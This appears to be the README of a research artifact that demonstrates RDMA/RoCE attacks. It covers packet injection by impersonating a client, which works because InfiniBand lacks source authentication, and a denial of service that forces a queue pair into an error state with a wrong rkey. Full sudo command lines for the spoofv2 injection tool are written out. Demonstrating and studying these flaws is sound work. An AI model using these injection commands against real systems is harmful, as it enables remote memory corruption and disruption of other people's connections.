# (A1) Packet Injection using Impersonation

The attack shows that an attacker can inject RDMA packets, since InfiniBand lacks source authentication. 


## Requirements
 * GCC >= 4.9 with C++11 features
 * rdma-core library, or equivalent RDMA verbs library 
 * RDMA-capable network devices must have assigned IP addresses
 * RDMA devices should be configured with RoCE enabled.
 * `sudo` access to inject a packet

## Usage 

To compile the code simply run `make`. 

To perform an attack, the victim connection should be created between a server and a client. The injection tool impersonates the client. The server should be launched first using `./server -a <IP> ` and then the client with `./client -a <IP> `, where `<IP>` is the IP address of the server. 
The server will print an example of a command that can be executed by the attacker to inject a RoCE *correct* packet.
For example, the server can output the following command:
```
sudo ./spoofv2 16 1 192.168.1.11 192.168.1.21 2319 10172812 94768298730720 563097
```
The command has the following format:
```
sudo ./spoofv2 <message size> <number of messages> <Source IP> <Destination IP> <QP number> <PSN> <remote address> <rkey>
```

The command above injects RDMA write packets and measures the injection time in microseconds. To inject a send packet, one should remove  `<remote address> <rkey>` arguments. For example:
```
sudo ./spoofv2 16 1 192.168.1.11 192.168.1.21 2319 10172812 
```

To facilitate the experiments, the client prints its state and also sends a message to the server each 60 seconds to check connectivity. In addition, the server prints messages when a Send request is received, and when a memory is corrupted by the attacker.

Basic usage. 
```
make
./server -a 192.168.1.10 
./client -a 192.168.1.10  % should be launched on a remote machine.
```


# (A2) DoS Attack by Transiting QPs to an Error State

To transition a QP to an error state, follow the instruction above for (A1), but modify the correct rkey of the injected roce packet. 

For example, if the correct command for injection is:
```
sudo ./spoofv2 16 1 192.168.1.11 192.168.1.21 2319 10172812 94768298730720 563097
```

Then you can use the following command to break a connection:
```
sudo ./spoofv2 16 1 192.168.1.11 192.168.1.21 2319 10172812 94768298730720 563098
```

Since the rkey is incorrect, the QP will transit to the error state. 